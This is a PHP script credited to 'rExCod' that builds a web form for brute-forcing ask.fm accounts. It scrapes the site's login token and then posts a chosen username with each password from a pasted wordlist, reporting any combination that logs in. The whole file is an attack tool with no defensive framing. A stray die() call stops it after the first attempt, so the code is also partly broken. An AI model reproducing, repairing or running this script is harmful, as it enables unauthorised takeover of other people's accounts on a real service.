 <?php
 /*
                By rExCod
                ask.fm | brute force *.*
                 twitter.com/rExHack - is-sec.com
  */
       
        echo "<form method='POST'><title>Ask.Fm Brute Force</title><center>
        <font face='Tahoma' size='5' color='Blue'><b>Ask.Fm</b></font><font face='Tahoma' size='2'><b> Brute Force</b><br>
        <input name='username' placeholder='username'><br>
        <textarea cols='50' rows='15' name='pass'></textarea><br>
        <input type='submit' value='Do it' /><br></form>";

        @set_time_limit(0);
        @error_reporting(0);
        $site = "http://ask.fm/login/";
        $username = $_POST['username'];
        $passl = explode("\r\n", $_POST['pass']);
        foreach($passl as $pass)
        {
                $hash = token($site);
                $x = brute($hash,$username,$pass);
                if(preg_match('#<form action="/logout" method="post">#', $x))
                {
                        //print $x;
                        print "<br>[+] Good : <font face='Tahoma' size='2' color='Green'><b>{$username}</b></font> | <font face='Tahoma' size='2' color='Green'><b>{$pass}</b></font><br>";
                        flush();flush();
                        break;
                }
        }
        # extract auth_token
        function token($site)
        {
                $curl = curl_init();
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($curl, CURLOPT_FOLLOWLOCATION,1);
                curl_setopt($curl, CURLOPT_URL, $site);
                curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd()."cookie.txt");
                curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd()."cookie.txt");
                $b0x = curl_exec($curl);
                preg_match('/<input name="authenticity_token" type="hidden" value="(.*?)" /' ,$b0x ,$token);
                return $token[1];
        }
       
        # brute
        function brute($hash,$username,$pass)
        {
                $curl = curl_init();
                curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($curl, CURLOPT_FOLLOWLOCATION,1);
                curl_setopt($curl, CURLOPT_URL, "http://ask.fm/session");
                curl_setopt($curl, CURLOPT_POSTFIELDS, "authenticity_token={$hash}&login={$username}&password={$pass}&commit=Log+in");
                curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd()."cookie.txt");
                curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd()."cookie.txt");
                $brute = curl_exec($curl);
                print_r($brute);
                die();
                return $brute;
        }
        @system("del cookie.txt");
        @system("rm cookie.txt");
        echo "<br><br><font face='Tahoma' size='2'>my twitter : twitter.com/rExHack</font>";
?>